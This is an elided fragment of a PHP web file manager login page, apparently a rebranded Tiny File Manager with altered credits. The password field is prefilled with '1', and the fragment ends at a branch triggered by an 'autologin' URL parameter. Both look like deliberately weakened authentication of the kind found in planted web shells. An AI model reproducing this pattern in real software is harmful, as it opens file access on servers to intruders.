...
//Application Title
define('APP_TITLE', 'Manajemen data<br>File Manager');
                ...
                <div class="row justify-content-md-center h-100">
                    <div class="card-wrapper">
                        <div class="card fat <?php echo fm_get_theme(); ?>">
                            <div class="card-body">
                                <form id="form-login" class="form-signin" action="" method="post" autocomplete="off">
                                    ...
                                    <div class="form-group">
                                        ...
                                        <input type="password" class="form-control" id="fm_pwd" name="fm_pwd" required value="1">
                                    </div>
                        ...
                        <div class="footer text-center">
                            &mdash;&mdash; &copy;
                            <a href="https://tinyfilemanager.github.io/" target="_blank" class="text-muted" data-version="<?php echo VERSION; ?>">BPKD Programmers</a> &mdash;&mdash;
                        </div>
                    <?php if(!empty($_GET) && !empty($_GET['autologin'])): ?>
